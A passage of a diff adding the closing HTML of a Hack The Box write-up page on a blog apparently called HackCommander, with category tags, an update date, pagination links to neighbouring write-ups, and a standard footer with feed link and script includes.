+      <a href="/categories/#hackthebox" class="page__taxonomy-item" rel="tag">hackthebox</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#infosec" class="page__taxonomy-item" rel="tag">infosec</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2020-02-15T00:00:00+01:00">February 15, 2020</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/htb-writeup-re/" class="pagination--pager" title="RE - Hack The Box
+">Previous</a>
+    
+    
+      <a href="/htb-writeup-zetta/" class="pagination--pager" title="Zetta - Hack The Box
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2022 HackCommander</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
